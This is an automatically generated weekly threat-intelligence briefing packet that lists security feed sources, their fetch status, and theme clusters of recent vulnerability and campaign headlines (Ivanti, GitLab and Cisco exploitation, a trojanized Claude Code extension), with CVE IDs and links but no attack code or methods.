# PHANTOMSignal Briefing Packet

- Generated: 2026-11-02T18:06:15.944943+00:00
- Lookback hours: 168
- Lookback human: 7 days
- Total feeds: 80
- Feeds OK: 75
- Total items in window: 351
- Total clusters raw: 160
- Total clusters in packet: 68
- Dropped low score: 92
- Dropped overflow: 0

## Cohort metadata

### threat_research_primary
- Description: Primary vendor and research-team intelligence with strong technical depth.
- Source count: 16
- Weight: 10

### government_authoritative
- Description: Authoritative English-language public-sector sources for advisories, vulnerabilities, standards, and public guidance.
- Source count: 2
- Weight: 9

### offensive_vulnerability_research
- Description: High-signal vulnerability research, offensive security analysis, and exploitability-focused sources.
- Source count: 9
- Weight: 10

### detection_response_operations
- Description: Practitioner-oriented sources focused on detection, response, hunting, MDR, and security operations.
- Source count: 11
- Weight: 8

### cloud_identity_infrastructure
- Description: Cloud, identity, SaaS, and infrastructure security research with emphasis on modern attack surfaces.
- Source count: 9
- Weight: 7

### ai_security_agentic_risk
- Description: AI security, LLM exploitation, model integrity, agentic system risk, and AI governance sources.
- Source count: 7
- Weight: 6

### ransomware_ecrime_financial_crime
- Description: Cybercrime, ransomware, extortion, fraud, and illicit financial ecosystem reporting.
- Source count: 4
- Weight: 7

### cyber_news_breach_reporting
- Description: Cybersecurity news, breach reporting, and industry trend coverage. Useful for awareness, not sufficient alone for technical claims.
- Source count: 8
- Weight: 4

### policy_strategy_geopolitics
- Description: Policy, strategy, cyber norms, geopolitics, national security, and regulatory interpretation.
- Source count: 1
- Weight: 5

### practitioner_analysis
- Description: Independent practitioner, researcher, and analyst voices. Best used for framing, interpretation, and reality checks.
- Source count: 6
- Weight: 5

### reddit_practitioner_osint
- Description: Reddit-based practitioner chatter and operational OSINT. Useful for weak signals, field texture, and reality checks, but never sufficient alone for technical claims.
- Source count: 7
- Weight: 2

## Feed status

- **SentinelOne Labs** (threat_research_primary)
  - URL: https://www.sentinelone.com/labs/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Unit 42** (threat_research_primary)
  - URL: https://unit42.paloaltonetworks.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 2
- **CrowdStrike** (threat_research_primary)
  - URL: https://www.crowdstrike.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Sekoia** (threat_research_primary)
  - URL: https://blog.sekoia.io/feed/
  - Status: fetch_error
  - Item count: 0
  - In window count: 0
- **Google Threat Analysis Group** (threat_research_primary)
  - URL: https://blog.google/threat-analysis-group/rss/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Microsoft Security Blog** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 5
- **Recorded Future** (threat_research_primary)
  - URL: https://www.recordedfuture.com/feed
  - Status: ok
  - Item count: 50
  - In window count: 1
- **Check Point Research** (threat_research_primary)
  - URL: https://research.checkpoint.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 3
- **Citizen Lab** (threat_research_primary)
  - URL: https://citizenlab.ca/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **NCSC UK** (government_authoritative)
  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Kaspersky Securelist** (threat_research_primary)
  - URL: https://securelist.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 5
- **Microsoft Threat Intelligence** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
  - Status: ok
  - Item count: 10
  - In window count: 3
- **SANS Internet Storm Center** (government_authoritative)
  - URL: https://isc.sans.edu/rssfeed_full.xml
  - Status: ok
  - Item count: 10
  - In window count: 10
- **ESET WeLiveSecurity** (threat_research_primary)
  - URL: https://www.welivesecurity.com/en/rss/feed/
  - Status: ok
  - Item count: 100
  - In window count: 4
- **Volexity** (threat_research_primary)
  - URL: https://www.volexity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Cisco Talos** (threat_research_primary)
  - URL: https://feeds.feedburner.com/feedburner/Talos
  - Status: ok
  - Item count: 15
  - In window count: 6
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - URL: https://horizon3.ai/feed/
  - Status: ok
  - Item count: 10
  - In window count: 3
- **Red Canary** (detection_response_operations)
  - URL: https://redcanary.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Exploit-DB** (offensive_vulnerability_research)
  - URL: https://www.exploit-db.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 0
- **Assetnote** (offensive_vulnerability_research)
  - URL: https://www.assetnote.io/resources/research/rss.xml
  - Status: ok
  - Item count: 78
  - In window count: 0
- **PortSwigger Research** (offensive_vulnerability_research)
  - URL: https://portswigger.net/research/rss
  - Status: ok
  - Item count: 40
  - In window count: 1
- **watchTowr Labs** (offensive_vulnerability_research)
  - URL: https://labs.watchtowr.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 0
- **The DFIR Report** (detection_response_operations)
  - URL: https://thedfirreport.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Trend Micro Research** (threat_research_primary)
  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
  - Status: ok
  - Item count: 25
  - In window count: 0
- **Black Hills Information Security** (detection_response_operations)
  - URL: https://www.blackhillsinfosec.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **TrustedSec** (detection_response_operations)
  - URL: https://www.trustedsec.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Proofpoint Threat Insight** (detection_response_operations)
  - URL: https://www.proofpoint.com/us/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Active Countermeasures** (detection_response_operations)
  - URL: https://www.activecountermeasures.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **GitHub Security Lab** (offensive_vulnerability_research)
  - URL: https://github.blog/category/security/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **SpecterOps** (detection_response_operations)
  - URL: https://medium.com/feed/specter-ops-posts
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Sophos X-Ops** (detection_response_operations)
  - URL: https://news.sophos.com/en-us/category/threat-research/feed/
  - Status: ok
  - Item count: 15
  - In window count: 3
- **Orca Security Research** (cloud_identity_infrastructure)
  - URL: https://orca.security/resources/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 4
- **Datadog Security Labs** (cloud_identity_infrastructure)
  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
  - Status: ok
  - Item count: 30
  - In window count: 1
- **Rapid7** (offensive_vulnerability_research)
  - URL: https://www.rapid7.com/blog/rss/
  - Status: ok
  - Item count: 20
  - In window count: 4
- **Permiso Security** (cloud_identity_infrastructure)
  - URL: https://permiso.io/blog/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **AWS Security Blog** (cloud_identity_infrastructure)
  - URL: https://aws.amazon.com/blogs/security/feed/
  - Status: ok
  - Item count: 20
  - In window count: 4
- **Huntress** (detection_response_operations)
  - URL: https://www.huntress.com/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 4
- **Trail of Bits** (offensive_vulnerability_research)
  - URL: https://blog.trailofbits.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Cloudflare Security** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/security/rss/
  - Status: ok
  - Item count: 20
  - In window count: 4
- **Google Project Zero** (offensive_vulnerability_research)
  - URL: https://googleprojectzero.blogspot.com/feeds/posts/default
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Sysdig** (detection_response_operations)
  - URL: https://sysdig.com/feed/
  - Status: ok
  - Item count: 100
  - In window count: 6
- **Protect AI** (ai_security_agentic_risk)
  - URL: https://protectai.com/blog/rss.xml
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Cloudflare Radar** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Google Cloud Threat Intelligence** (threat_research_primary)
  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
  - Status: ok
  - Item count: 20
  - In window count: 3
- **Wiz Research** (cloud_identity_infrastructure)
  - URL: https://www.wiz.io/feed/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 5
- **Coveware** (ransomware_ecrime_financial_crime)
  - URL: https://www.coveware.com/blog?format=rss
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Chainalysis** (ransomware_ecrime_financial_crime)
  - URL: https://www.chainalysis.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 5
- **Google DeepMind Blog** (ai_security_agentic_risk)
  - URL: https://deepmind.google/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 3
- **OpenSSF Blog** (ai_security_agentic_risk)
  - URL: https://openssf.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **BleepingComputer** (cyber_news_breach_reporting)
  - URL: https://www.bleepingcomputer.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 15
- **The Record** (cyber_news_breach_reporting)
  - URL: https://therecord.media/feed
  - Status: ok
  - Item count: 5
  - In window count: 5
- **Interconnects** (ai_security_agentic_risk)
  - URL: https://www.interconnects.ai/feed
  - Status: ok
  - Item count: 20
  - In window count: 2
- **SecurityWeek** (cyber_news_breach_reporting)
  - URL: https://www.securityweek.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **CyberScoop** (cyber_news_breach_reporting)
  - URL: https://cyberscoop.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **GreyNoise** (cloud_identity_infrastructure)
  - URL: https://www.greynoise.io/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Simon Willison** (ai_security_agentic_risk)
  - URL: https://simonwillison.net/atom/everything/
  - Status: ok
  - Item count: 30
  - In window count: 16
- **Intel 471** (ransomware_ecrime_financial_crime)
  - URL: https://intel471.com/blog/feed
  - Status: ok
  - Item count: 50
  - In window count: 2
- **AI Snake Oil** (ai_security_agentic_risk)
  - URL: https://www.aisnakeoil.com/feed
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Help Net Security** (cyber_news_breach_reporting)
  - URL: https://www.helpnetsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Dark Reading** (cyber_news_breach_reporting)
  - URL: https://www.darkreading.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 27
- **Schneier on Security** (practitioner_analysis)
  - URL: https://www.schneier.com/feed/atom/
  - Status: ok
  - Item count: 10
  - In window count: 5
- **Team Cymru** (ransomware_ecrime_financial_crime)
  - URL: https://www.team-cymru.com/post/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 6
- **Google Cloud Security** (cloud_identity_infrastructure)
  - URL: https://cloudblog.withgoogle.com/rss/
  - Status: ok
  - Item count: 20
  - In window count: 20
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/cybersecurity/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Troy Hunt** (practitioner_analysis)
  - URL: https://www.troyhunt.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 2
- **Reddit r/blueteamsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/blueteamsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Graham Cluley** (practitioner_analysis)
  - URL: https://grahamcluley.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 4
- **Reddit r/sysadmin** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/sysadmin/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/msp** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/msp/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/netsecstudents** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsecstudents/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/AskNetsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/AskNetsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **The Hacker News** (cyber_news_breach_reporting)
  - URL: https://feeds.feedburner.com/TheHackersNews
  - Status: ok
  - Item count: 50
  - In window count: 50
- **Krebs on Security** (practitioner_analysis)
  - URL: https://krebsonsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - URL: https://www.infosecurity-magazine.com/rss/news/
  - Status: ok
  - Item count: 100
  - In window count: 25
- **Reddit r/netsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsec/.rss
  - Status: ok
  - Item count: 25
  - In window count: 25
- **tl;dr sec** (practitioner_analysis)
  - URL: https://tldrsec.com/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Just Security** (policy_strategy_geopolitics)
  - URL: https://www.justsecurity.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Embrace the Red** (ai_security_agentic_risk)
  - URL: https://embracethered.com/blog/index.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Risky Business News** (practitioner_analysis)
  - URL: https://risky.biz/feeds/risky-business-news/
  - Status: ok
  - Item count: 100
  - In window count: 6
- **Elastic Security Labs** (detection_response_operations)
  - URL: https://www.elastic.co/security-labs/rss/feed.xml
  - Status: ok
  - Item count: 100
  - In window count: 0

## Affinity groups (themes)

### zero day targeting Ivanti
- Anchor signal: Ivanti
- Theme key: ivanti
- Cluster count: 4
- Article count: 8
- Cohesion: 0.27
- Shared strong signals: Ivanti
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, supply_chain, data_breach
  - affected_products: Ivanti, GitLab, WordPress
  - urgency_signals: zero_day
- Cluster IDs: 092dfcb803, 77167f8fc4, 134597acf3, d4d341f5f6
- Links:
  - https://www.rapid7.com/blog/post/etr-additional-ivanti-connect-secure-zero-days-exploited-in-the-wild-cve-2026-111357-cve-2026-118527
  - https://thehackernews.com/2026/10/attackers-chain-three-ivanti-connect.html
  - https://www.securityweek.com/ivanti-patches-two-more-zero-days-exploited-in-connect-secure-attack-chain/
  - https://www.helpnetsecurity.com/2026/11/02/cisa-to-federal-agencies-remediate-exploited-ivanti-connect-secure-vulnerabilities-cve-2026-111357-cve-2026-118527/
  - https://www.bleepingcomputer.com/news/security/ivanti-patches-two-more-connect-secure-zero-days-chained-in-attacks/
  - https://www.securityweek.com/revolve-data-breach-impacts-at-least-180000-people/
  - https://www.securityweek.com/chainalysis-discloses-data-breach-following-ai-driven-cyberattack/
  - https://thehackernews.com/2026/10/china-linked-hackers-exploited-vmware.html

### ransomware extortion targeting GitLab
- Anchor signal: GitLab
- Theme key: gitlab
- Cluster count: 4
- Article count: 8
- Cohesion: 0.303
- Shared strong signals: GitLab
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion, supply_chain, data_breach
  - affected_products: GitLab, Ivanti, WordPress
  - urgency_signals: no_patch_yet
- Cluster IDs: 2c1062209b, f402bd5782, 77167f8fc4, 134597acf3
- Links:
  - https://www.bleepingcomputer.com/news/security/over-1-000-gitlab-servers-vulnerable-to-code-execution-attacks/
  - https://thehackernews.com/2026/10/cisa-adds-actively-exploited-gitlab-rce.html
  - https://www.interconnects.ai/p/was-i-wrong-about-open-models-and
  - https://www.bleepingcomputer.com/news/security/synology-warns-customers-of-ongoing-c3rb3r-ransomware-attacks/
  - https://www.securityweek.com/revolve-data-breach-impacts-at-least-180000-people/
  - https://www.securityweek.com/chainalysis-discloses-data-breach-following-ai-driven-cyberattack/

### Linux kernel active exploitation
- Anchor signal: Linux kernel
- Theme key: linux-kernel
- Cluster count: 4
- Article count: 7
- Cohesion: 0.208
- Shared strong signals: Linux kernel
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: credential_theft, web_shell_backdoor, active_exploitation
  - affected_industries: financial_services
  - affected_products: Linux kernel
  - cve_ids: CVE-2026-98432
  - urgency_signals: actively_exploited, preauth_unauth
- Cluster IDs: 892f20b51d, 78a030ca21, b56ffde518, 31d233a8e7
- Links:
  - https://isc.sans.edu/diary/rss/33482
  - https://thehackernews.com/2026/10/linux-kernel-tcp-flaw-with-98-cvss.html
  - https://blog.trailofbits.com/2026/11/02/backporting-security-fixes-at-scale-with-codex/
  - https://www.welivesecurity.com/en/business-security/lessons-cybersecurity-black-week/
  - https://research.checkpoint.com/2026/2nd-november-threat-intelligence-report/
  - https://thehackernews.com/2026/10/wordpress-rce-flaw-draws-nearly-63000.html
  - https://www.reddit.com/r/netsec/comments/1xlsgc8/wordpress_pingback_and_brotli_rce/

### Cisco active exploitation
- Anchor signal: Cisco
- Theme key: cisco
- Cluster count: 3
- Article count: 5
- Cohesion: 0.205
- Shared strong signals: Cisco
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion, active_exploitation, apt_espionage
  - affected_products: Cisco
  - urgency_signals: actively_exploited
- Cluster IDs: 8df24b48a3, bce7fc7634, 084d29f299
- Links:
  - https://blog.talosintelligence.com/nik-c2-new-ai-enabled-framework/
  - https://thehackernews.com/2026/10/hackers-exploited-cisco-sd-wan-flaw-to.html
  - https://thehackernews.com/2026/10/cisco-patches-actively-exploited-asa.html
  - https://blog.talosintelligence.com/ir-trends-q3-2026/

### Volt Typhoon: apt espionage
- Anchor signal: Volt Typhoon
- Theme key: volt-typhoon
- Cluster count: 3
- Article count: 3
- Cohesion: 0.206
- Shared strong signals: Volt Typhoon
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: apt_espionage
  - actor_attribution: Volt Typhoon
  - affected_industries: aviation_defense, critical_infrastructure
  - cve_ids: CVE-2026-20127
- Cluster IDs: bce7fc7634, b9771fe2d2, d20e88c36e
- Links:
  - https://thehackernews.com/2026/10/cisco-patches-actively-exploited-asa.html
  - https://www.team-cymru.com/post/defense-industrial-base-nation-state-network-telemetry
  - https://thehackernews.com/2026/10/volt-typhoon-used-covert-silent-train.html

### phishing social eng targeting Microsoft Defender
- Anchor signal: Microsoft Defender
- Theme key: microsoft-defender
- Cluster count: 3
- Article count: 17
- Cohesion: 0.347
- Shared strong signals: Microsoft Defender
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: phishing_social_eng
  - affected_products: Microsoft Defender
- Cluster IDs: e2ef42690e, 618b08e33f, d566b95cff
- Links:
  - https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/
  - https://research.checkpoint.com/2026/tricks-from-the-past-deployed-via-signed-chatgpt-and-claude-binaries/
  - https://www.securityweek.com/malicious-claude-code-extension-served-in-cursor-supply-chain-attack/
  - https://www.sophos.com/en-us/blog/malicious-claude-code-extension-distributed-through-cursor-marketplace
  - https://www.darkreading.com/cyberattacks-data-breaches/devs-trojanized-claude-code-extension-cursor
  - https://thehackernews.com/2026/10/official-claude-code-vs-code-extension.html
  - https://www.infosecurity-magazine.com/news/attackers-hide-malware-behind/
  - https://www.microsoft.com/en-us/security/blog/2026/10/30/help-desk-impersonation-ad-cs-abuse-investigating-esc1-esc8-intrusion-paths/
  - https://www.microsoft.com/en-us/security/blog/2026/10/29/tracking-ai-adoption-in-north-korean-threat-actor-tradecraft/

### Cl0p campaign activity
- Anchor signal: Cl0p
- Theme key: cl0p
- Cluster count: 2
- Article count: 3
- Cohesion: 0.267
- Shared strong signals: Cl0p
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - actor_attribution: Cl0p
- Cluster IDs: 5fe11c121c, fb556ca51b
- Links:
  - https://orca.security/resources/research/cve-2026-101767-critical-oracle-ebs-sql-injection-actively-probed-in-the-wild/
  - https://thehackernews.com/2026/10/hackers-target-critical-oracle-e.html
  - https://www.team-cymru.com/post/cl0p-ransomware-mft-attack-pattern-threat-intelligence

### supply chain targeting WordPress
- Anchor signal: WordPress
- Theme key: wordpress
- Cluster count: 3
- Article count: 4
- Cohesion: 0.406
- Shared strong signals: WordPress
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: supply_chain, data_breach
  - affected_products: WordPress, GitLab, Ivanti
- Cluster IDs: 77167f8fc4, 134597acf3, 31d233a8e7
- Links:
  - https://www.securityweek.com/revolve-data-breach-impacts-at-least-180000-people/
  - https://www.securityweek.com/chainalysis-discloses-data-breach-following-ai-driven-cyberattack/
  - https://thehackernews.com/2026/10/wordpress-rce-flaw-draws-nearly-63000.html
  - https://www.reddit.com/r/netsec/comments/1xlsgc8/wordpress_pingback_and_brotli_rce/

### phishing social eng targeting Google Workspace
- Anchor signal: Google Workspace
- Theme key: google-workspace
- Cluster count: 2
- Article count: 6
- Cohesion: 0.2
- Shared strong signals: Google Workspace
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: phishing_social_eng
  - affected_products: Google Workspace, Microsoft 365
  - urgency_signals: no_patch_yet
- Cluster IDs: 2c1062209b, 5e5aace957
- Links:
  - https://www.bleepingcomputer.com/news/security/over-1-000-gitlab-servers-vulnerable-to-code-execution-attacks/
  - https://thehackernews.com/2026/10/cisa-adds-actively-exploited-gitlab-rce.html
  - https://www.interconnects.ai/p/was-i-wrong-about-open-models-and
  - https://www.bleepingcomputer.com/news/security/new-android-sms-of-death-exploit-can-remotely-crash-unpatched-phones/

### phishing social eng targeting Microsoft 365
- Anchor signal: Microsoft 365
- Theme key: microsoft-365
- Cluster count: 2
- Article count: 6
- Cohesion: 0.2
- Shared strong signals: Microsoft 365
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: phishing_social_eng
  - affected_products: Google Workspace, Microsoft 365
  - urgency_signals: no_patch_yet
- Cluster IDs: 2c1062209b, 5e5aace957
- Links:
  - https://www.bleepingcomputer.com/news/security/over-1-000-gitlab-servers-vulnerable-to-code-execution-attacks/
  - https://thehackernews.com/2026/10/cisa-adds-actively-exploited-gitlab-rce.html
  - https://www.interconnects.ai/p/was-i-wrong-about-open-models-and
  - https://www.bleepingcomputer.com/news/security/new-android-sms-of-death-exploit-can-remotely-crash-unpatched-phones/

### CVE-2026-102764 exploitation activity
- Anchor signal: CVE-2026-102764
- Theme key: cve-2026-102764
- Cluster count: 2
- Article count: 2
- Cohesion: 0.2
- Shared strong signals: CVE-2026-102764
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - cve_ids: CVE-2026-102764
- Cluster IDs: 91d1381147, d4d341f5f6
- Links:
  - https://www.rapid7.com/blog/post/ra-rapid7-analysis-unauthenticated-file-upload-to-rce-in-beyondtrust-remote-support-cve-2026-102764
  - https://thehackernews.com/2026/10/china-linked-hackers-exploited-vmware.html

### CVE-2026-111497 exploitation activity
- Anchor signal: CVE-2026-111497
- Theme key: cve-2026-111497
- Cluster count: 2
- Article count: 5
- Cohesion: 0.2
- Shared strong signals: CVE-2026-111497
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - cve_ids: CVE-2026-111497
- Cluster IDs: 3069205f26, b56ffde518
- Links:
  - https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce
  - https://www.sophos.com/en-us/blog/node2shell-cve-2026-111497-in-active-exploitation
  - https://orca.security/resources/research/cve-2026-111497-nodejs-brotli-rce/
  - https://securitylabs.datadoghq.com/articles/node2shell-cve-2026-111497-nodejs-brotli-decoder/
  - https://research.checkpoint.com/2026/2nd-november-threat-intelligence-report/

## Forward signals

### Novelty
- Novel cves: 5
  - CVE-2021-22205 (first seen via BleepingComputer at 2026-11-02T11:28:42+00:00, cluster f402bd5782)
  - CVE-2021-26084 (first seen via BleepingComputer at 2026-11-02T11:28:42+00:00, cluster f402bd5782)
  - CVE-2024-10441 (first seen via BleepingComputer at 2026-11-02T11:28:42+00:00, cluster f402bd5782)
  - CVE-2024-10445 (first seen via BleepingComputer at 2026-11-02T11:28:42+00:00, cluster f402bd5782)
  - CVE-2024-50629 (first seen via BleepingComputer at 2026-11-02T11:28:42+00:00, cluster f402bd5782)
- Novel actors: 1
  - UNC6993 (first seen via Google Cloud Threat Intelligence at 2026-11-02T14:00:00+00:00, cluster b4921fee31)
- Novel products: 0

### Velocity bursts (2)
- **Inside a malicious Claude Code-branded extension and its persistent SSH backdoor**
  - Cluster: e2ef42690e
  - Sources in window: 3
  - Window hours: 4.9
  - Cohort count: 3
- **Additional Ivanti Connect Secure zero-days exploited in the wild (CVE-2026-111357, CVE-2026-118527)**
  - Cluster: 092dfcb803
  - Sources in window: 3
  - Window hours: 3.1
  - Cohort count: 2

### Leading edge (0)

### Convergence (15)
- Pair: CVE-2026-111357 + Ivanti (cluster 092dfcb803, first observation: True)
- Pair: CVE-2026-111357 + Microsoft BitLocker (cluster 092dfcb803, first observation: True)
- Pair: CVE-2026-118527 + Ivanti (cluster 092dfcb803, first observation: True)
- Pair: CVE-2026-118527 + Microsoft BitLocker (cluster 092dfcb803, first observation: True)
- Pair: CVE-2026-101767 + Cl0p (cluster 5fe11c121c, first observation: True)
- Pair: CVE-2026-20127 + OpenAI/ChatGPT (cluster 8df24b48a3, first observation: True)
- Pair: CVE-2026-109618 + Palo Alto Networks (cluster 5aa0fb9542, first observation: True)
- Pair: CVE-2026-109619 + Palo Alto Networks (cluster 5aa0fb9542, first observation: True)
- Pair: CVE-2026-109691 + Palo Alto Networks (cluster 5aa0fb9542, first observation: True)
- Pair: CVE-2026-0723 + Google Workspace (cluster 2c1062209b, first observation: True)
- Pair: CVE-2026-0723 + Microsoft 365 (cluster 2c1062209b, first observation: True)
- Pair: CVE-2026-110264 + Google Workspace (cluster 2c1062209b, first observation: True)
- Pair: CVE-2026-110264 + Microsoft 365 (cluster 2c1062209b, first observation: True)
- Pair: CVE-2026-85706 + Google Workspace (cluster 2c1062209b, first observation: True)
- Pair: CVE-2026-85706 + Microsoft 365 (cluster 2c1062209b, first observation: True)

### Drift (3)
- **Rhysida** (cluster 084d29f299)
  - New industries: telecommunications
  - New products: Cisco
  - Prior top industries: financial_services, government, healthcare
  - Prior top products: Apple iOS/macOS, Microsoft Defender, Snowflake
- **UNC5221** (cluster d4d341f5f6)
  - New industries: government, legal_professional
  - New products: Citrix, GitHub, Ivanti
  - Prior top industries: critical_infrastructure, manufacturing_industrial, telecommunications
  - Prior top products: Anthropic/Claude, Apple iOS/macOS, Azure
- **UNC3236** (cluster d20e88c36e)
  - New industries: telecommunications
  - New products: (none)
  - Prior top industries: aviation_defense, critical_infrastructure, government
  - Prior top products: (none)

### Persistence (12)
- actor_attribution: Cl0p (weeks observed: 12, cluster 5fe11c121c)
- actor_attribution: UNC5221 (weeks observed: 9, cluster d4d341f5f6)
- actor_attribution: Volt Typhoon (weeks observed: 7, cluster bce7fc7634)
- actor_attribution: Salt Typhoon (weeks observed: 7, cluster b9771fe2d2)
- actor_attribution: BlackCat/ALPHV (weeks observed: 7, cluster 4b77037fd4)
- actor_attribution: Rhysida (weeks observed: 6, cluster 084d29f299)
- cve_ids: CVE-2026-85706 (weeks observed: 4, cluster 2c1062209b)
- cve_ids: CVE-2026-104935 (weeks observed: 3, cluster 092dfcb803)
- cve_ids: CVE-2026-102764 (weeks observed: 3, cluster 91d1381147)
- cve_ids: CVE-2026-110264 (weeks observed: 3, cluster 2c1062209b)
- cve_ids: CVE-2026-97229 (weeks observed: 3, cluster 2c1062209b)
- cve_ids: CVE-2026-16812 (weeks observed: 3, cluster d20e88c36e)

### Tier inversion (4)
- **Stopping Remote Code Execution with Sandboxes, CVE-2026-115995: Rust Zip**
  - Cluster: 24d8131bb5
  - Primary source: Reddit r/netsec
  - Strong signals: CVE-2026-115995
- **Mirage2FA stole 4,561 M365 session cookies despite MFA via AiTM proxy (CVE-2026-69836 CVSS 10.0) : detection rules and WHfB/Cloud Kerberos Trust hardening guide**
  - Cluster: d797e0f3c5
  - Primary source: Reddit r/netsec
  - Strong signals: CVE-2026-69836
- **TeamViewer RCE Vulnerability (CVE-2026-11585)**
  - Cluster: fcee7a9b28
  - Primary source: Reddit r/netsec
  - Strong signals: CVE-2026-11585
- **Axis Camera Station Deep-Dive: Unauth RCE to Decrypting Every Camera Credential (CVE-2025-30026/30023 + CVE-2026-63286)**
  - Cluster: 5cefe132d9
  - Primary source: Reddit r/netsec
  - Strong signals: CVE-2025-30026, CVE-2026-63286

## Clusters

### Cluster 092dfcb803 — score 54

- Title: Additional Ivanti Connect Secure zero-days exploited in the wild (CVE-2026-111357, CVE-2026-118527)
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-11-02T11:04:08+00:00
- Link: https://www.rapid7.com/blog/post/etr-additional-ivanti-connect-secure-zero-days-exploited-in-the-wild-cve-2026-111357-cve-2026-118527
- Fetch status: ok
- Member count: 5
- Corroborating source count: 5
- Strong signals: CVE-2026-104935, CVE-2026-111357, CVE-2026-118527, Ivanti

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, credential_theft, zero_day
- affected_industries: government, manufacturing_industrial
- affected_products: Ivanti, Microsoft BitLocker
- cve_ids: CVE-2026-104935, CVE-2026-111357, CVE-2026-118527
- urgency_signals: actively_exploited, no_patch_yet, preauth_unauth, zero_day
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_4_news

#### Primary article taxonomy
- threat_categories: credential_theft, zero_day, active_exploitation
- affected_industries: manufacturing_industrial
- affected_products: Ivanti, Microsoft BitLocker
- cve_ids: CVE-2026-111357, CVE-2026-118527, CVE-2026-104935
- urgency_signals: actively_exploited, zero_day, preauth_unauth, no_patch_yet
